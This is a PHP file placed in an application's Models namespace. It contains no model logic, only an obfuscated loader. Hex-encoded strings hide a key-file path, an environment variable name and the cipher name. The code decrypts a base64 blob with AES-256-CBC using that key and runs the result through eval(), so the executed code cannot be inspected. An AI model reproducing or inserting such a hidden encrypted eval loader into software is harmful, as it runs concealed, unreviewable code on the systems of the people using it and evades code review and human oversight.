<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('k+EFTLFtBjg/94nsRHa/YQ==');

$c=base64_decode(

'GjRXzv+cG/lQeqS7I6IpjlTm33apO151P2tVAn+bsbmARHo7RVp0AaGXhacuhUbAgFDkNzdaNswb' .
'j0opusjH+eBuP8WXh34V5t8R5HOENOYK3ev14cxVVXIYwx+w9REC5MCvAgPpCT+wrj0xG74QrjQq' .
'IVvDCNRqJ7f651GZshycVtWs20ulBpFrp8FoWeazW9TOFg5JWXLO2IwsP3MvUsRPb5W6/WQ1GeTr' .
'VWpakmCb3Zn8AsRID9iLpZbuTLB0qVpYqBrbmEV0Q6Z7z+1AngCc1T5z6fl2imJW3kkDz9Q73Vm9' .
'fGvuS7/1lsNXVggVo3D34osluKA6mK9hFihL4jkExqdv0iPVtLC+xEbQdmrGNJ1xQXxFYVHoagUY' .
'TWOLtCBpFBlrVsOOKR9pvV6f9moGjJJntm5uninoQai+K+DprZ5zhLurO/dC1jDas7erxPWhYzIE' .
'FTzs+0W4GnCvTQe1pnGtpEAqK5Vsv7s0kC/bu5uHljotty66gUazCzRo3p7zM2ugO2KF9MXxYahL' .
'YUjTbkbs5l1IzDbfxBU1lIl/XbMnnjFHTYVIL5VkpteSDrBd0TOpW0/ebtyhoS61y7SKnba9BQGW' .
'NEXpb/vTsLqBkuoKO4n1GBYy223gQ7PxtKvdkb7jnVBguCrwFBzKQZ5HLpj5F23dP9ZaBXs8ZKwm' .
'RwowKAkOvxKNabv/AO3e9uU2tfwj8RbVJFd7KuHLTNoaO2obzA/oTvzvAcwctfujMCB7tbiDJv9j' .
'0aMqDwRqahNqmhhwONa4umTrh8hNjF+cLz5jCZgnKeXh0UrUnLbwDuHOtHFgyK0dGG7TJ+YOdg/F' .
'YKhPxlkr9xi+HfJE9Dtnhnkso01VcSVJI/wGYWcVkkXAR+INtt7ikZszHb5z'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

